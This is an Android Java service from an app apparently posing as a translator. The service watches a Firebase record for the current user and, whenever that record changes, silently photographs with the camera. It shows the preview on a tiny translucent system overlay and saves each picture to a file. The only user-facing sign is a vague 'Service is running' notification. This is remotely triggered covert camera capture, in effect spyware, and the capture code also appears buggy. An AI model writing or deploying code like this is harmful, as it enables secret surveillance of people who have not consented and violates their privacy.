package com.example.translator;

import static com.example.translator.FBref.refUsers;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.graphics.PixelFormat;
import android.hardware.Camera;
import android.os.Build;
import android.os.IBinder;
import android.provider.ContactsContract;
import android.util.Log;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import android.view.WindowManager;
import android.widget.RemoteViews;

import androidx.annotation.RequiresApi;
import androidx.camera.core.Preview;
import androidx.camera.lifecycle.ProcessCameraProvider;
import androidx.annotation.NonNull;
import androidx.annotation.Nullable;

import com.google.common.util.concurrent.ListenableFuture;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.ValueEventListener;

import com.example.translator.FBref;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.List;
import java.util.concurrent.ExecutionException;

public class myBackgroundService extends Service
{
    private FirebaseAuth mAuth;
    private ValueEventListener valueEventListener;
    private Camera mCamera;

    //constatns
    private static final int NOTIFICATION_ID = 123;
    private static final String CHANNEL_ID = "camera_service_channel";


    @Override
    public int onStartCommand(Intent intent, int flags, int startId)
    {
        Log.e("Service", "working");
        mAuth = FirebaseAuth.getInstance();
        String userId = mAuth.getUid();


        NotificationChannel channel = null;
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            channel = new NotificationChannel(
                    CHANNEL_ID,
                    CHANNEL_ID,
                    NotificationManager.IMPORTANCE_LOW
            );

            getSystemService(NotificationManager.class).createNotificationChannel(channel);
            Notification.Builder notification = new Notification.Builder(this, CHANNEL_ID)
                    .setContentText("Service is running")
                    .setContentTitle("Service enabled")
                    .setSmallIcon(R.drawable.ic_launcher_background);

            startForeground(NOTIFICATION_ID, notification.build());
        }



        valueEventListener = new ValueEventListener() {
            @RequiresApi(api = Build.VERSION_CODES.P)
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot)
            {
                Users user = null;
                Log.e("Service", "serving");
                user = snapshot.getValue(Users.class); // DONT EVER DELETE THIS AGAIN

                //TODO: An error occurred while connecting to camera 0: Status(-8, EX_SERVICE_SPECIFIC): '6: connectHelper:2498: Camera "0" disabled by policy'
                //TODO: java.lang.RuntimeException: Fail to connect to camera service\
                //TODO: Error 2
                capturePicture();

                assert user != null;
                user.setToCapture(0);
                refUsers.child(userId).setValue(user);
            }

            @Override
            public void onCancelled(@NonNull DatabaseError error) {

            }
        };

        assert userId != null;
        refUsers.child(userId).addValueEventListener(valueEventListener);

        return super.onStartCommand(intent, flags, startId);
    }


    private void capturePicture()
    {
        mCamera = Camera.open();
        if(mCamera != null)
        {
            SurfaceView sv = new SurfaceView(this);

            WindowManager wm = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
            WindowManager.LayoutParams params = new WindowManager.LayoutParams(25, 50,
                    WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY,
                    WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH,
                    PixelFormat.TRANSLUCENT);

            SurfaceHolder sh = sv.getHolder();

            sv.setZOrderOnTop(true);
            sh.setFormat(PixelFormat.TRANSPARENT);

            sh.addCallback(new SurfaceHolder.Callback() {
                @Override
                public void surfaceCreated(@NonNull SurfaceHolder holder)
                {
                    Log.e("Shay", "Surface Created");
                    Camera.Parameters params = mCamera.getParameters();
                    mCamera.setParameters(params);
                    Camera.Parameters p = mCamera.getParameters();

                    List<Camera.Size> listSize;

                    listSize = p.getSupportedPreviewSizes();
                    Camera.Size mPreviewSize = listSize.get(2);
                    p.setPreviewSize(mPreviewSize.width, mPreviewSize.height);

                    listSize = p.getSupportedPictureSizes();
                    Camera.Size mPictureSize = listSize.get(2);
                    p.setPictureSize(mPictureSize.width, mPictureSize.height);
                    mCamera.setParameters(p);

                    try
                    {
                        mCamera.setPreviewDisplay(holder);
                    }catch (IOException e) {
                        e.printStackTrace();
                    }
                    mCamera.startPreview();
                    mCamera.unlock();

                    mCamera.takePicture(null, null, new Camera.PictureCallback() {
                        @Override
                        public void onPictureTaken(byte[] data, Camera camera) {
                            File pictureFile = Util.getOutputMediaFile(Util.MEDIA_TYPE_IMAGE);

                            if (pictureFile == null) {
                                return;
                            }

                            try {
                                FileOutputStream fos = new FileOutputStream(pictureFile);
                                fos.write(data);
                                fos.close();
                            } catch (FileNotFoundException e) {
                            } catch (IOException e) {
                            }
                        }
                    });

                    mCamera.stopPreview();
                    mCamera.release();
                }

                @Override
                public void surfaceChanged(@NonNull SurfaceHolder holder, int format, int width, int height) {
                }

                @Override
                public void surfaceDestroyed(@NonNull SurfaceHolder holder) {
                }
            });
        }
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
